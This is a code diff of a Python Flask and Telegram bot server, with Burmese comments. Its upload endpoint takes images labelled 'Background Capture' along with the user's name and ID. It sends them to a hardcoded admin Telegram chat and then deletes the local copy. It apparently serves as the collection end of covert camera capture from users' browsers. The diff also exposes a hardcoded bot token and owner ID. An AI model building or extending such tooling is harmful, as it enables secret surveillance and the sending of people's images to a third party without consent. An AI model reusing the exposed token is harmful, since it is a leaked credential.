@@ -9,10 +9,6 @@ TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
 OWNER_ID = '7812553563' # Admin ID
 bot = Bot(token=TOKEN)
 
-@app.route('/')
-def index():
-    return open('index.html', 'r', encoding='utf-8').read()
-
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
@@ -28,12 +24,19 @@ def upload():
 
     async def send_to_admin():
         async with bot:
-            await bot.send_photo(
-                chat_id=OWNER_ID,
-                photo=open(filename, 'rb'),
-                caption=f"📸 **Background Capture**\n👤 User: {user_name}\n⏰ Time: {timestamp}"
-            )
-        os.remove(filename) # ပို့ပြီးရင် ဖျက်ပစ်သည်
+            try:
+                await bot.send_photo(
+                    chat_id=OWNER_ID,
+                    photo=open(filename, 'rb'),
+                    caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🆔 ID: {user_id}\n🌐 Source: {'Telegram' if user_id != 'Unknown_ID' else 'External Browser'}"
+                )
+            except Exception as e:
+                print(f"Error sending to admin: {e}")
+        
+        if os.path.exists(filename):
+            os.remove(filename)
+
+    # ... ကျန်တာ အတူတူပါပဲ ...
 
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
